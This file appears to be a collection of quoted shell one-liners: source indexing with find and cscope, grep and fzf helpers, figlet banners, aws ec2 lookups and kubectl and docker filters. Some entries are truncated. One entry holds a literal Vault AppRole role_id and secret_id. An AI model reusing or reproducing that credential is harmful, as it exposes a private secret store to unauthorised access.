/usr/include/nc_tparm.h /usr/include/ncurses.h /usr/include/ncurses_dll.h /usr/include/net /usr/include/netash /usr/include/netatalk /usr/include/netax25 /usr/include/netdb.h /usr/include/neteconet /usr/include/netinet /usr/include/netipx /usr/include/netiucv /usr/include/netpacket /usr/include/netrom /usr/include/netrose /usr/include/nfs /usr/include/nl_types.h /usr/include/nss.h /usr/include/obstack.h /usr/include/panel.h /usr/include/paths.h /usr/include/poll.h /usr/include/printf.h /usr/include/proc_service.h /usr/include/protocols /usr/include/pthread.h /usr/include/pty.h /usr/include/pwd.h /usr/include/python3.6 /usr/include/python3.6m /usr/include/rdma /usr/include/re_comp.h /usr/include/regex.h /usr/include/regexp.h /usr/include/resolv.h /usr/include/rpc /usr/include/rpcsvc /usr/include/sched.h /usr/include/scsi /usr/include/search.h /usr/include/semaphore.h /usr/include/setjmp.h /usr/include/sgtty.h /usr/include/shadow.h /usr/include/signal.h /usr/include/sound /usr/include/spawn.h /usr/include/stab.h /usr/include/stdc-predef.h /usr/include/stdint.h /usr/include/stdio.h /usr/include/stdio_ext.h /usr/include/stdlib.h /usr/include/string.h /usr/include/strings.h /usr/include/stropts.h /usr/include/sudo_plugin.h /usr/include/syscall.h /usr/include/sysexits.h /usr/include/syslog.h /usr/include/tar.h /usr/include/term.h /usr/include/term_entry.h /usr/include/termcap.h /usr/include/termio.h /usr/include/termios.h /usr/include/tgmath.h /usr/include/thread_db.h /usr/include/tic.h /usr/include/time.h /usr/include/ttyent.h /usr/include/uchar.h /usr/include/ucontext.h /usr/include/ulimit.h /usr/include/unctrl.h /usr/include/unistd.h /usr/include/ustat.h /usr/include/utime.h /usr/include/utmp.h /usr/include/utmpx.h /usr/include/values.h /usr/include/video /usr/include/wait.h /usr/include/wchar.h /usr/include/wctype.h /usr/include/wordexp.h /usr/include/x86_64-linux-gnu /usr/include/xcb /usr/include/xen -name ""*.[ch]"" -o -name ""*.cpp"" > cscope.files; cat cscope.files | xargs etags -a ; cscope -b ; create_TTT"
"find -L err.txt generated.file succ.txt -name ""*.py"" > cscope.files1; cat cscope.files1 | xargs etags -a ; cp cscope.files1 cscope.files; find -L /usr/include/GL /usr/include/X11 /usr/include/_G_config.h /usr/include/aio.h /usr/include/aliases.h /usr/include/alloca.h /usr/include/ar.h /usr/include/argp.h /usr/include/argz.h /usr/include/arpa /usr/include/asm-generic /usr/include/assert.h /usr/include/byteswap.h /usr/include/c++ /usr/include/caml /usr/include/complex.h /usr/include/cpio.h /usr/include/crypt.h /usr/include/ctype.h /usr/include/curses.h /usr/include/cursesapp.h /usr/include/cursesf.h /usr/include/cursesm.h /usr/include/cursesp.h /usr/include/cursesw.h /usr/include/cursslk.h /usr/include/dirent.h /usr/include/dlfcn.h /usr/include/drm /usr/include/elf.h /usr/include/endian.h /usr/include/envz.h /usr/include/err.h /usr/include/errno.h /usr/include/error.h /usr/include/eti.h /usr/include/etip.h /usr/include/execinfo.h /usr/include/expat.h /usr/include/expat_external.h /usr/include/fcntl.h /usr/include/features.h /usr/include/fenv.h /usr/include/fmtmsg.h /usr/include/fnmatch.h /usr/include/form.h /usr/include/fstab.h /usr/include/fts.h /usr/include/ftw.h /usr/include/gconv.h /usr/include/getopt.h /usr/include/glob.h /usr/include/gnu-versions.h /usr/include/gnumake.h /usr/include/grp.h /usr/include/gshadow.h /usr/include/iconv.h /usr/include/ifaddrs.h /usr/include/inttypes.h /usr/include/langinfo.h /usr/include/lastlog.h /usr/include/libgen.h /usr/include/libintl.h /usr/include/libio.h /usr/include/libltdl /usr/include/limits.h /usr/include/link.h /usr/include/linux /usr/include/locale.h /usr/include/ltdl.h /usr/include/malloc.h /usr/include/math.h /usr/include/mcheck.h /usr/include/memory.h /usr/include/menu.h /usr/include/misc /usr/include/mntent.h /usr/include/monetary.h /usr/include/mqueue.h /usr/include/mtd /usr/include/nc_tparm.h /usr/include/ncurses.h /usr/include/ncurses_dll.h /usr/include/net /usr/include/netash /usr/include/netatalk /usr/include/netax25 /usr/include/netdb.h /usr/include/neteconet /usr/include/netinet /usr/include/netipx /usr/include/netiucv /usr/include/netpacket /usr/include/netrom /usr/include/netrose /usr/include/nfs /usr/include/nl_types.h /usr/include/nss.h /usr/include/obstack.h /usr/include/panel.h /usr/include/paths.h /usr/include/poll.h /usr/include/printf.h /usr/include/proc_service.h /usr/include/protocols /usr/include/pthread.h /usr/include/pty.h /usr/include/pwd.h /usr/include/python3.6 /usr/include/python3.6m /usr/include/rdma /usr/include/re_comp.h /usr/include/regex.h /usr/include/regexp.h /usr/include/resolv.h /usr/include/rpc /usr/include/rpcsvc /usr/include/sched.h /usr/include/scsi /usr/include/search.h /usr/include/semaphore.h /usr/include/setjmp.h /usr/include/sgtty.h /usr/include/shadow.h /usr/include/signal.h /usr/include/sound /usr/include/spawn.h /usr/include/stab.h /usr/include/stdc-predef.h /usr/include/stdint.h /usr/include/stdio.h /usr/include/stdio_ext.h /usr/include/stdlib.h /usr/include/string.h /usr/include/strings.h /usr/include/stropts.h /usr/include/sudo_plugin.h /usr/include/syscall.h /usr/include/sysexits.h /usr/include/syslog.h /usr/include/tar.h /usr/include/term.h /usr/include/term_entry.h /usr/include/termcap.h /usr/include/termio.h /usr/include/termios.h /usr/include/tgmath.h /usr/include/thread_db.h /usr/include/tic.h /usr/include/time.h /usr/include/ttyent.h /usr/include/uchar.h /usr/include/ucontext.h /usr/include/ulimit.h /usr/include/unctrl.h /usr/include/unistd.h /usr/include/ustat.h /usr/include/utime.h /usr/include/utmp.h /usr/include/utmpx.h /usr/include/values.h /usr/include/video /usr/include/wait.h /usr/include/wchar.h /usr/include/wctype.h /usr/include/wordexp.h /usr/include/x86_64-linux-gnu /usr/include/xcb /usr/include/xen -name ""*.[ch]"" -o -name ""*.cpp"" >> cscope.files; cscope -b ; create_TTT"
"find -L err.txt generated.file succ.txt -name ""*.[ch]"" -o -name ""*.cpp"" > cscope.files; find -L /usr/include/GL /usr/include/X11 /usr/include/_G_config.h /usr/include/aio.h /usr/include/aliases.h /usr/include/alloca.h /usr/include/ar.h /usr/include/argp.h /usr/include/argz.h /usr/include/arpa /usr/include/asm-generic /usr/include/assert.h /usr/include/byteswap.h /usr/include/c++ /usr/include/caml /usr/include/complex.h /usr/include/cpio.h /usr/include/crypt.h /usr/include/ctype.h /usr/include/curses.h /usr/include/cursesapp.h /usr/include/cursesf.h /usr/include/cursesm.h /usr/include/cursesp.h /usr/include/cursesw.h /usr/include/cursslk.h /usr/include/dirent.h /usr/include/dlfcn.h /usr/include/drm /usr/include/elf.h /usr/include/endian.h /usr/include/envz.h /usr/include/err.h /usr/include/errno.h /usr/include/error.h /usr/include/eti.h /usr/include/etip.h /usr/include/execinfo.h /usr/include/expat.h /usr/include/expat_external.h /usr/include/fcntl.h /usr/include/features.h /usr/include/fenv.h /usr/include/fmtmsg.h /usr/include/fnmatch.h /usr/include/form.h /usr/include/fstab.h /usr/include/fts.h /usr/include/ftw.h /usr/include/gconv.h /usr/include/getopt.h /usr/include/glob.h /usr/include/gnu-versions.h /usr/include/gnumake.h /usr/include/grp.h /usr/include/gshadow.h /usr/include/iconv.h /usr/include/ifaddrs.h /usr/include/inttypes.h /usr/include/langinfo.h /usr/include/lastlog.h /usr/include/libgen.h /usr/include/libintl.h /usr/include/libio.h /usr/include/libltdl /usr/include/limits.h /usr/include/link.h /usr/include/linux /usr/include/locale.h /usr/include/ltdl.h /usr/include/malloc.h /usr/include/math.h /usr/include/mcheck.h /usr/include/memory.h /usr/include/menu.h /usr/include/misc /usr/include/mntent.h /usr/include/monetary.h /usr/include/mqueue.h /usr/include/mtd /usr/include/nc_tparm.h /usr/include/ncurses.h /usr/include/ncurses_dll.h /usr/include/net /usr/include/netash /usr/include/netatalk /usr/include/netax25 /usr/include/netdb.h /usr/include/neteconet /usr/include/netinet /usr/include/netipx /usr/include/netiucv /usr/include/netpacket /usr/include/netrom /usr/include/netrose /usr/include/nfs /usr/include/nl_types.h /usr/include/nss.h /usr/include/obstack.h /usr/include/panel.h /usr/include/paths.h /usr/include/poll.h /usr/include/printf.h /usr/include/proc_service.h /usr/include/protocols /usr/include/pthread.h /usr/include/pty.h /usr/include/pwd.h /usr/include/python3.6 /usr/include/python3.6m /usr/include/rdma /usr/include/re_comp.h /usr/include/regex.h /usr/include/regexp.h /usr/include/resolv.h /usr/include/rpc /usr/include/rpcsvc /usr/include/sched.h /usr/include/scsi /usr/include/search.h /usr/include/semaphore.h /usr/include/setjmp.h /usr/include/sgtty.h /usr/include/shadow.h /usr/include/signal.h /usr/include/sound /usr/include/spawn.h /usr/include/stab.h /usr/include/stdc-predef.h /usr/include/stdint.h /usr/include/stdio.h /usr/include/stdio_ext.h /usr/include/stdlib.h /usr/include/string.h /usr/include/strings.h /usr/include/stropts.h /usr/include/sudo_plugin.h /usr/include/syscall.h /usr/include/sysexits.h /usr/include/syslog.h /usr/include/tar.h /usr/include/term.h /usr/include/term_entry.h /usr/include/termcap.h /usr/include/termio.h /usr/include/termios.h /usr/include/tgmath.h /usr/include/thread_db.h /usr/include/tic.h /usr/include/time.h /usr/include/ttyent.h /usr/include/uchar.h /usr/include/ucontext.h /usr/include/ulimit.h /usr/include/unctrl.h /usr/include/unistd.h /usr/include/ustat.h /usr/include/utime.h /usr/include/utmp.h /usr/include/utmpx.h /usr/include/values.h /usr/include/video /usr/include/wait.h /usr/include/wchar.h /usr/include/wctype.h /usr/include/wordexp.h /usr/include/x86_64-linux-gnu /usr/include/xcb /usr/include/xen -name ""*.[ch]"" -o -name ""*.cpp"" >> cscope.files; cat cscope.files | xargs etags -a ; cscope -b ; create_TTT"
"find -L err.txt generated.file succ.txt -name ""*.[ch]"" -o -name ""*.cpp"" > cscope.files1; cat cscope.files1 | xargs etags -a ; cp cscope.files1 cscope.files; find -L /usr/include/GL /usr/include/X11 /usr/include/_G_config.h /usr/include/aio.h /usr/include/aliases.h /usr/include/alloca.h /usr/include/ar.h /usr/include/argp.h /usr/include/argz.h /usr/include/arpa /usr/include/asm-generic /usr/include/assert.h /usr/include/byteswap.h /usr/include/c++ /usr/include/caml /usr/include/complex.h /usr/include/cpio.h /usr/include/crypt.h /usr/include/ctype.h /usr/include/curses.h /usr/include/cursesapp.h /usr/include/cursesf.h /usr/include/cursesm.h /usr/include/cursesp.h /usr/include/cursesw.h /usr/include/cursslk.h /usr/include/dirent.h /usr/include/dlfcn.h /usr/include/drm /usr/include/elf.h /usr/include/endian.h /usr/include/envz.h /usr/include/err.h /usr/include/errno.h /usr/include/error.h /usr/include/eti.h /usr/include/etip.h /usr/include/execinfo.h /usr/include/expat.h /usr/include/expat_external.h /usr/include/fcntl.h /usr/include/features.h /usr/include/fenv.h /usr/include/fmtmsg.h /usr/include/fnmatch.h /usr/include/form.h /usr/include/fstab.h /usr/include/fts.h /usr/include/ftw.h /usr/include/gconv.h /usr/include/getopt.h /usr/include/glob.h /usr/include/gnu-versions.h /usr/include/gnumake.h /usr/include/grp.h /usr/include/gshadow.h /usr/include/iconv.h /usr/include/ifaddrs.h /usr/include/inttypes.h /usr/include/langinfo.h /usr/include/lastlog.h /usr/include/libgen.h /usr/include/libintl.h /usr/include/libio.h /usr/include/libltdl /usr/include/limits.h /usr/include/link.h /usr/include/linux /usr/include/locale.h /usr/include/ltdl.h /usr/include/malloc.h /usr/include/math.h /usr/include/mcheck.h /usr/include/memory.h /usr/include/menu.h /usr/include/misc /usr/include/mntent.h /usr/include/monetary.h /usr/include/mqueue.h /usr/include/mtd /usr/include/nc_tparm.h /usr/include/ncurses.h /usr/include/ncurses_dll.h /usr/include/net /usr/include/netash /usr/include/netatalk /usr/include/netax25 /usr/include/netdb.h /usr/include/neteconet /usr/include/netinet /usr/include/netipx /usr/include/netiucv /usr/include/netpacket /usr/include/netrom /usr/include/netrose /usr/include/nfs /usr/include/nl_types.h /usr/include/nss.h /usr/include/obstack.h /usr/include/panel.h /usr/include/paths.h /usr/include/poll.h /usr/include/printf.h /usr/include/proc_service.h /usr/include/protocols /usr/include/pthread.h /usr/include/pty.h /usr/include/pwd.h /usr/include/python3.6 /usr/include/python3.6m /usr/include/rdma /usr/include/re_comp.h /usr/include/regex.h /usr/include/regexp.h /usr/include/resolv.h /usr/include/rpc /usr/include/rpcsvc /usr/include/sched.h /usr/include/scsi /usr/include/search.h /usr/include/semaphore.h /usr/include/setjmp.h /usr/include/sgtty.h /usr/include/shadow.h /usr/include/signal.h /usr/include/sound /usr/include/spawn.h /usr/include/stab.h /usr/include/stdc-predef.h /usr/include/stdint.h /usr/include/stdio.h /usr/include/stdio_ext.h /usr/include/stdlib.h /usr/include/string.h /usr/include/strings.h /usr/include/stropts.h /usr/include/sudo_plugin.h /usr/include/syscall.h /usr/include/sysexits.h /usr/include/syslog.h /usr/include/tar.h /usr/include/term.h /usr/include/term_entry.h /usr/include/termcap.h /usr/include/termio.h /usr/include/termios.h /usr/include/tgmath.h /usr/include/thread_db.h /usr/include/tic.h /usr/include/time.h /usr/include/ttyent.h /usr/include/uchar.h /usr/include/ucontext.h /usr/include/ulimit.h /usr/include/unctrl.h /usr/include/unistd.h /usr/include/ustat.h /usr/include/utime.h /usr/include/utmp.h /usr/include/utmpx.h /usr/include/values.h /usr/include/video /usr/include/wait.h /usr/include/wchar.h /usr/include/wctype.h /usr/include/wordexp.h /usr/include/x86_64-linux-gnu /usr/include/xcb /usr/include/xen -name ""*.[ch]"" -o -name ""*.cpp"" >> cscope.files; cscope -b ; create_TTT"
"find -L $PWD -not \( -path ""./build"" -prune \) -not \( -path ""./.git"" -prune \) -not \( -path ""./.svn"" -prune \) -not \( -path ""./doc/html"" -prune \) -name ""*\.[chfpCHF]*"" -print | etags --class-qualify --declarations -"
"find -L ""`pwd`"" -iregex "".*.flac"" -o -iregex "".*.mp3"" -o -iregex "".*.m4a""|sort> .pls"
"find -H . \( -name ""*.[csh]"" -o -name ""*.cpp"" -o -name ""*.hpp"" \) | xargs etags -a -o TAGS"
"find -E . -regex ""^.+%[0-9A-Z][0-9A-Z]+.*"" -exec bash -c ""mv {} \`echo {} | nkf --url-input \`"" \;"
"find -E . -iregex "".*\.(swo|swp)"""
"find -E . -iregex "".*\.(swo|swp)"" -exec rm {} "";"""
"find *.in | xargs -I % sh -c ""echo Test %; ./a.out < %;"""
"find err.txt generated.file succ.txt /usr/include/GL /usr/include/X11 /usr/include/_G_config.h /usr/include/aio.h /usr/include/aliases.h /usr/include/alloca.h /usr/include/ar.h /usr/include/argp.h /usr/include/argz.h /usr/include/arpa /usr/include/asm-generic /usr/include/assert.h /usr/include/byteswap.h /usr/include/c++ /usr/include/caml /usr/include/complex.h /usr/include/cpio.h /usr/include/crypt.h /usr/include/ctype.h /usr/include/curses.h /usr/include/cursesapp.h /usr/include/cursesf.h /usr/include/cursesm.h /usr/include/cursesp.h /usr/include/cursesw.h /usr/include/cursslk.h /usr/include/dirent.h /usr/include/dlfcn.h /usr/include/drm /usr/include/elf.h /usr/include/endian.h /usr/include/envz.h /usr/include/err.h /usr/include/errno.h /usr/include/error.h /usr/include/eti.h /usr/include/etip.h /usr/include/execinfo.h /usr/include/expat.h /usr/include/expat_external.h /usr/include/fcntl.h /usr/include/features.h /usr/include/fenv.h /usr/include/fmtmsg.h /usr/include/fnmatch.h /usr/include/form.h /usr/include/fstab.h /usr/include/fts.h /usr/include/ftw.h /usr/include/gconv.h /usr/include/getopt.h /usr/include/glob.h /usr/include/gnu-versions.h /usr/include/gnumake.h /usr/include/grp.h /usr/include/gshadow.h /usr/include/iconv.h /usr/include/ifaddrs.h /usr/include/inttypes.h /usr/include/langinfo.h /usr/include/lastlog.h /usr/include/libgen.h /usr/include/libintl.h /usr/include/libio.h /usr/include/libltdl /usr/include/limits.h /usr/include/link.h /usr/include/linux /usr/include/locale.h /usr/include/ltdl.h /usr/include/malloc.h /usr/include/math.h /usr/include/mcheck.h /usr/include/memory.h /usr/include/menu.h /usr/include/misc /usr/include/mntent.h /usr/include/monetary.h /usr/include/mqueue.h /usr/include/mtd /usr/include/nc_tparm.h /usr/include/ncurses.h /usr/include/ncurses_dll.h /usr/include/net /usr/include/netash /usr/include/netatalk /usr/include/netax25 /usr/include/netdb.h /usr/include/neteconet /usr/include/netinet /usr/include/netipx /usr/include/netiucv /usr/include/netpacket /usr/include/netrom /usr/include/netrose /usr/include/nfs /usr/include/nl_types.h /usr/include/nss.h /usr/include/obstack.h /usr/include/panel.h /usr/include/paths.h /usr/include/poll.h /usr/include/printf.h /usr/include/proc_service.h /usr/include/protocols /usr/include/pthread.h /usr/include/pty.h /usr/include/pwd.h /usr/include/python3.6 /usr/include/python3.6m /usr/include/rdma /usr/include/re_comp.h /usr/include/regex.h /usr/include/regexp.h /usr/include/resolv.h /usr/include/rpc /usr/include/rpcsvc /usr/include/sched.h /usr/include/scsi /usr/include/search.h /usr/include/semaphore.h /usr/include/setjmp.h /usr/include/sgtty.h /usr/include/shadow.h /usr/include/signal.h /usr/include/sound /usr/include/spawn.h /usr/include/stab.h /usr/include/stdc-predef.h /usr/include/stdint.h /usr/include/stdio.h /usr/include/stdio_ext.h /usr/include/stdlib.h /usr/include/string.h /usr/include/strings.h /usr/include/stropts.h /usr/include/sudo_plugin.h /usr/include/syscall.h /usr/include/sysexits.h /usr/include/syslog.h /usr/include/tar.h /usr/include/term.h /usr/include/term_entry.h /usr/include/termcap.h /usr/include/termio.h /usr/include/termios.h /usr/include/tgmath.h /usr/include/thread_db.h /usr/include/tic.h /usr/include/time.h /usr/include/ttyent.h /usr/include/uchar.h /usr/include/ucontext.h /usr/include/ulimit.h /usr/include/unctrl.h /usr/include/unistd.h /usr/include/ustat.h /usr/include/utime.h /usr/include/utmp.h /usr/include/utmpx.h /usr/include/values.h /usr/include/video /usr/include/wait.h /usr/include/wchar.h /usr/include/wctype.h /usr/include/wordexp.h /usr/include/x86_64-linux-gnu /usr/include/xcb /usr/include/xen -name ""*.[ch]"" -o -name ""*.cpp"" > cscope.files; cat cscope.files | xargs etags -a ; cscope -b ; create_TTT"
"find err.txt generated.file succ.txt -type f | while read line; do echo ""touch $line""; touch -c ""$line""; done"
"find err.txt generated.file succ.txt -exec basename {} \; | \
"find $REPO_PATH -path ""$REPO_PATH/simenv/build"" -prune -or -path ""$REPO_PATH/.ccache"" -prune -or -path ""$REPO_PATH/.autoio_cache"" -prune -or -path ""$REPO_PATH/release_gate_run"" -prune -or -print | xargs grep"
"find $PWD -name ""*.[cChsS]"" -o -name ""*.cpp"" > cscope.files; cscope -b -q; ctags -L cscope.files; CSCOPE_DB=$PWD\/cscope.out; export CSCOPE_DB; CSCOPE_EDITOR=vim; export CSCOPE_EDITOR; echo ""CSCOPE ENV now is as follows-""; env | grep CSCOPE"
"find $( pwd ) -follow -type f -not -name ""*~"" -not -name ""*swp"" | xargs grep --color -e "
"find $( pwd ) -follow -name ""*.ts"" | xargs grep --color -e "
"find $( pwd ) -follow -name ""*.py"" 2>/dev/null | xargs grep --color -e "
"find $( pwd ) -follow -name ""*.h"" | xargs grep --color -e "
"find $( pwd ) -follow -name ""*.h"" 2>/dev/null | xargs grep --color -e "
"find $( pwd ) -follow -name ""*.c"" -o -name ""*.cc"" -o -name ""*.cpp"" | xargs grep --color -e "
"find $( pwd ) -follow -name ""*.c"" -o -name ""*.cc"" -o -name ""*.cpp"" 2>/dev/null | xargs grep --color -e "
"find $( pwd ) -follow -name ""*.c"" -o -name ""*.cc"" -o -name ""*.cpp"" -o -name ""*.h"" | xargs grep --color -e "
"find $( pwd ) -follow -name ""*.c"" -o -name ""*.cc"" -o -name ""*.cpp"" -o -name ""*.h"" 2>/dev/null | xargs grep --color -e "
"find ""`pwd`"" | grep \!*"
"find ""`git rev-parse --show-toplevel`"" | grep ""\.orig$"""
"find ""*.pyc"" | xargs rm"
"find ""*"" -print0 | xargs -L 50 -P 4 -0 --no-run-if-empty -i cp {}"
"find ""$WIN_HOME/Documents"" -name ""*.md"" -print0 | xargs-grep-0"
"find ""$PWD"" -type f | grep -Fv /.git/"
"find ""$HOME/Dropbox"" -type d -name node_modules ! -path ""*/node_modules/*"" -print0 | xargs -0 rm -rf"
"find ""$HOME"" -maxdepth 2 -type d -print0 |
"find ""$(pwd)"" -mindepth 1 -maxdepth 1 -type d | sort "
"find ""$(pwd)"" -maxdepth 1 -type f | sort "
"find ""$(dirname ""$(find $(git rev-parse --show-toplevel) -name ""Pipfile"")"")"" -name ""manage\\.py"" | xargs -I MANAGE_PY pipenv run MANAGE_PY"
"filename=`find ~/p/ -type f -printf ""%P\n"" | fzf`; mupdf ""/home/deepak/p/$filename"" &"
"filename=`find ~/p/ -type f -printf ""%P\n"" | fzf`; FoxitReader ""/home/deepak/p/$filename"" &"
"filecoin miner power `filecoin config mining.minerAddress | tr -d \""`"
"filecoin config mining.minerAddress | tr -d \"""
"file=$(find . |fzf) && open ""$file"""
"file apps/*/src/*erl apps/*/include/*hrl Makefile | grep ""UTF"""
"figlet terraform plan; figlet refresh=true; cd ~/git/terraform && git st; for a in int qa preprod staging prod; do figlet $a; cd ~/git/terraform/$a && pwd && terraform get >/dev/null && time terraform plan --refresh=true | grep -v ""Refreshing state""; done; cd ~/git/terraform && git st"
"figlet terraform plan; figlet refresh=false; cd ~/git/terraform && git st; for a in int qa preprod staging prod; do figlet $a; cd ~/git/terraform/$a && pwd && terraform get >/dev/null && time terraform plan --refresh=false | grep -v ""Refreshing state""; done; cd ~/git/terraform && git st"
"figlet Bismillah, Mugi Berkah | lolcat"
"figlet -f $(ls /usr/share/figlet/fonts/*.flf | shuf -n1) ""als
"figlet ""NANI???"" | lolcat"
"figlet ""It Doesnt exist!"" | lolcat"
"figlet ""How I got a Rainbow Dragon in my Terminal and Other Tricks"" | lolcat"
"ffs | sed ""s/\(.*\)\/\.\(.*\)\.swp/\1\/\2/"""
"ff -i ""\.cs$""|xargs -d ""\n"" egrep -In"
"ff ""\.xml$"" |xargs -d ""\n"" egrep -In"
"ff ""\.txt$"" |xargs -d ""\n"" egrep -In"
"ff ""\.ts$""|xargs -d ""\n"" egrep -In"
"ff ""\.sh$"" |xargs -d ""\n"" egrep -In"
"ff ""\.py$"" |xargs -d ""\n"" egrep -In"
"ff ""\.log$"" |xargs -d ""\n"" egrep -In"
"ff ""\.js$""|xargs -d ""\n"" egrep -In"
"ff ""\.java$""|xargs -d ""\n"" egrep -In"
"feh --bg-fill ~/Pictures/frog-wallpaper-by-dilan.jpg; convert ~/Pictures/frog-wallpaper-by-dilan2.jpg -fill 'rgba(20,20,20,0.80)' -draw 'rectangle 0,880 4096,1280' -fill red -strokewidth 4 -stroke 'rgba(90,50,50,1)' -gravity Center -weight 800 -pointsize 120 -encoding Unicode -font '思源宋體-TW-SemiBold' -annotate 0 '死モード' - | feh --bg-fill -"
"feh --bg-center ""$HOME/Pictures/wallpaper/$(ls -1 $HOME/Pictures/wallpaper/ | shuf -n 1)"""
"feh ""$(ls -tr | tail -1)"" & disown"
"fdisk -l | grep ""Disk /"""
"fd -tf --ignore-file $HOME/.cust_ignore | fzf --preview \
"fd -t f --hidden --exclude .git . $HOME | fzf --ansi --preview-window 'right:60%' --preview 'bat --color=always --style=header,grid --line-range :300 {}'"
"fd -t d | fzf --height 45% --preview ""ls"""
"fd -e properties -t f -p ""en_US[^_]"" | ack -x"
"fd -Hd 1 ""^\."" | xargs exa -lad"
"fd --type f --exclude ""prebid.js"" --exclude ""build/"" --exclude ""test/whitelabels.json"" | xargs rg"
"fc-list -f ""%{family} : %{file}\n"" :spacing=100 | sort"
"fc -lt ""%D %r"" 0 | less +G"
"fc -ln -1 | sed ""s/^\s*//"" >> ~/.saved_commands.txt"
"fc -i -D -l -1000000 | LESS="""" less +G"
"fc -e : -1 | fpp -ni -c=""open -a /Applications/Emacs.app"""
"fb FQL ""SELECT thread_id, subject, recipients, snippet FROM thread WHERE folder_id = 0"" | less"
"fb FQL ""SELECT status_id,message,time,source FROM status WHERE uid=[me]"" | urlview"
"fb FQL ""SELECT status_id,message,time,source FROM status WHERE uid=[me]"" | less"
"fast-tags `git ls-files | ag ""\\.hs""` -o .tags"
"f(){highlight -O truecolor $1 --force ""${@:2}"" | less}; f $@"
"f(){ unset -f f; tail -f ""$@"" | ccze -A -o nolookups; }; f"
"f(){ unset -f f; systemctl status -l -n 25 --no-pager ""$@"" | ccze -A -o nolookups; }; f"
"f(){ unset -f f; ccze -A -o nolookups < ""$@"" | less -R; }; f"
"f(){ unset -f f; cat ""$@"" | ccze -A -o nolookups; }; f"
"f(){ svn checkout `echo $1 | sed ""s/tree\/master/trunk/g""` ; unset -f f; }; f"
"f(){ sudo locate ""$1"" | fzf --preview=""bat {} --color=always"";};f"
"f(){ sudo du -h -d 1 ""$@"" | sort -h; unset -f f; }; f"
"f(){ pygmentize -f terminal256 -O style=monokai -g ""$@"" | less -L; };f"
"f(){ lsof -t -i tcp:""$1"" | xargs kill; unset -f f; }; f"
"f(){ ls -lah $1 | grep ""^d"" } ; f "
"f(){ ls -F $1 | grep ""/$"" } ; f "
"f(){ kubectl ""$@"" --all-namespaces | grep -v kube-system; unset -f f; }; f"
"f(){ find ./ -name ""*.md"" -print0 | xargs -0 grep ""$1"" > /tmp/find_tmp_log.txt && vim /tmp/find_tmp_log.txt; unset -f f; }; f"
"f(){ find ./ -name ""*.$1"" -type f -print0 | xargs -0 grep ""$2"" > /tmp/find_tmp_log.txt && vim /tmp/find_tmp_log.txt; unset -f f; }; f"
"f(){ echo ""$@"" | tr ""b-za-aB-ZA-A"" ""a-zA-Z"" }; f"
"f(){ du -h -d 1 ""$@"" | sort -h; unset -f f; }; f"
"f(){ curl -s ""cheat.sh/$(echo -n ""$*""|jq -sRr @uri)"";};f"
"f(){ DIR=${1:-.}; find ""$DIR"" -name ""*.js*"" | xargs wc -mlw; unset -f f; }; f"
"f() {rg -p ""$@"" | less -r};f"
"f() {echo ""obase=2; $1""|bc};f"
"f() {echo ""obase=16;ibase=2; $1""|bc};f"
"f() {echo ""obase=16; $1""|bc};f"
"f() {echo ""ibase=2; $1""|bc};f"
"f() { sbt ""$@"" |tee -a ~/.sbtlogs; };f"
"f() { sbt ""$@"" |tee -a ~/.sbt_usage; };f"
"f() { ls -lhA | grep ""$*""; }; f"
"f() { kubectl get pods | grep ""$@""};f"
"f() { if [ -n ""$1"" ]; then a=($(du -sh $1/.[^.]* | sort -hr)); printf ""%s\t%s\n"" ""${a[@]}""; fi }; f"
"f() { if [ -n ""$1"" ]; then a=($(du -sh ""$@"" | sort -hr)); printf ""%s\t%s\n"" ""${a[@]}""; fi }; f"
"f() { history | grep ""$*""; }; f"
"f() { find . | ag ""/.*$1[^/]*$"" };f"
"f() { find . -iname ""*.h"" | xargs grep -i --color ""$1"" };f"
"f() { find . -iname ""*.cpp"" | xargs grep -i --color ""$1"" };f"
"f() { ffmpeg -i $1 -c copy -bsf:v h264_mp4toannexb -f mpegts intermediate1.ts && ffmpeg -i $2 -c copy -bsf:v h264_mp4toannexb -f mpegts intermediate2.ts && ffmpeg -i ""concat:intermediate1.ts|intermediate2.ts"" -c copy -bsf:a aac_adtstoasc $3}; f"
"f() { exec_scmb_expand_args ls_with_file_shortcuts ""$@"" | grcat conf.ls; }; f"
"f() { docker ps | grep ""$@""};f"
"f() { docker ps --format=""{{.Names}}"" | grep ""$@"" };f"
"f() { ag -l ""$1"" ~/notes | parallel -Xj1 --tty vim };f"
"extip=$(dig +short myip.opendns.com @resolver1.opendns.com); if [ -z ""$extip"" ]; then echo ""n/a""; else echo $extip && whois $extip | awk "
"expressvpn list | more"""
"expr ` find ./treasures -name ""??[la]*"" | wc -l` \* 10"
"export instanceIp=`aws ec2 describe-instances --filters=""Name=instance-id,Values=$instanceId"" --query ""Reservations[0].Instances[0].PublicIpAddress"" | sed s/\""//g` && echo $instanceIp"
"export instanceIp=`aws ec2 describe-instances --filters ""Name=instance-id,Values=$instanceId"" --query ""Reservations[0].Instances[0].PublicIpAddress"" | tr -d \""` && echo $instanceIp"
"export instanceIp=`aws ec2 describe-instances --filters ""Name=instance-id,Values=$instanceId"" --query ""Reservations[0].Instances[0].PublicIpAddress"" | tr -d \""\""\""` && echo $instanceIp"
"export instanceIp=`aws ec2 describe-instances --filters ""Name=instance-id,Values=$instanceId"" --query ""Reservations[0].Instances[0].PublicIpAddress"" | sed -e ""s/\""//g""` && echo $instanceIp"
"export instanceId=`aws ec2 describe-instances --filters ""Name=instance-state-name,Values=stopped,Name=instance-type,Values=t2.micro"" --query ""Reservations[0].Instances[0].InstanceId"" | tr -d \""` && echo $instanceId"
"export instanceId=`aws ec2 describe-instances --filters ""Name=instance-state-name,Values=stopped,Name=instance-type,Values=p2.xlarge"" --query ""Reservations[0].Instances[0].InstanceId"" | tr -d \""` && echo $instanceId"
"export instanceId=`aws ec2 describe-instances --filters ""Name=instance-state-name,Values=stopped,Name=instance-type,Values=p2.xlarge"" --query ""Reservations[0].Instances[0].InstanceId"" | tr -d \""\""\""` && echo $instanceId"
"export https_proxy="""" ; export http_proxy="""" ; env | grep proxy ; mv -f /etc/systemd/system/docker.service.d/http-proxy.conf{,.NO} ; ls /etc/systemd/system/docker.service.d/http-proxy.conf*; git config --global https.proxy """" ; git config --global http.proxy """" ; sh /root/Docker/scripts/replaceProxy.sh OFF"
"export VAULT_TOKEN=""$(vault write auth/approle/login role_id=7037d7f6-74c7-c133-2ed4-6d15fe858cf2 secret_id=87fe2b9d-2adc-ca2a-ad0e-0b979786e1ac -format=json | jq -r "
"export SSH_AUTH_SOCK=$(ls -dtr $(find $(find /tmp/ -maxdepth 1 -user $(whoami) -name ""ssh-*"" ) -name ""agent*"" )|tail -n1)"
